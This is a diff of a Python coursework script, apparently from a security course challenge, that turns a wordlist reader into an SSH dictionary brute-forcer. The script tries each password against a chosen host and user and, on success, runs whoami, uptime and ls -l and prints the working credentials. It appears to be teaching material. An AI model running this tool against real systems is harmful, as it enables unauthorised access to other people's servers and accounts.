@@ -1,31 +1,65 @@
 #!/usr/bin/env python3
 
-# Script:                   401 Op Challenge Day 16
+# Script:                   401 Op Challenge Day 17
 # Author:                   Courtney Hans
-# Date of latest revision:  10/26/20
+# Date of latest revision:  10/27/20
 # Purpose:                  Automated Brute Force Wordlist Attack Tool (1 of 3)
 
 # Import libraries
-import time, getpass
+from pexpect import pxssh
+import time, getpass, sys
 
 # Declare variables
 
 # Declare functions
 
-def iterator ():
-    filepath = input("Enter your dictionary filepath:\n")
+# Sample SSH authentication script
+
+def iterator():
+    host = input("Enter target host:  ")
+    username = input("Enter target username:  ")
+    filepath = input("Enter your dictionary filepath:  ")
     #filepath = '/home/osboxes/Desktop/rockyou2.txt' #test filepath
-    
     file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
     line = file.readline()
-    while line:
-        line = line.rstrip()
-        word = line
-        print(word)
-        time.sleep(1)
-        line = file.readline()
-    file.close()
+    success = "no"
+    if success == "no":
+        while line:
+            line = line.rstrip()
+            pwd = line
+            print(f"Checking '{pwd}'...")
+            s = pxssh.pxssh()
 
+            try:
+                s.login(host, username, pwd)
+                print("\nYou're in!")
+                s.sendline('whoami')
+                s.prompt()
+                print(f"Username: {str(s.before)[12:-5]}  Password: {pwd}") # print everything before the prompt.
+                s.sendline('uptime')
+                s.prompt()
+                print((s.before).decode()) # use .decode() for human-friendly formatting
+                s.sendline('ls -l')
+                s.prompt()
+                print((s.before).decode())
+                s.logout()
+                success = "yes"
+                print("[*] Mission accomplished, returning to menu.")
+                break
+
+            except pxssh.ExceptionPxssh as e:
+                print("Login attempt failed.")
+            
+            except KeyboardInterrupt: # graceful exit message if user hits CTRL C
+                print("\n\n[*] User requested an interrupt")
+                sys.exit()
+
+            time.sleep(.5)
+            line = file.readline()
+
+        file.close()
+    else:
+        exit
 
 def check_password():
     usr_password = getpass.getpass(prompt="Please enter a password:  ")
@@ -58,7 +92,6 @@ def check_password():
     t2 = time.time()
     print("\nTime taken to scan: %.6f" %(t2 - t1))
 
-
 # Main
 
 if __name__ == "__main__": # when my computer runs this file...do this stuff
@@ -79,10 +112,5 @@ Brue Force Wordlist Attack Tool Menu
         else:
             print("Invalid selection...") 
 
-
-# resource: https://www3.ntu.edu.sg/home/ehchua/programming/webprogramming/Python_FileText.html
-# resource: https://stackoverflow.com/questions/16709638/checking-the-strength-of-a-password-how-to-check-conditions
-# resource: https://pypi.org/project/password-strength/
-# resource: https://stackoverflow.com/questions/19699367/for-line-in-results-in-unicodedecodeerror-utf-8-codec-cant-decode-byte
-
+# resource: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
 # End
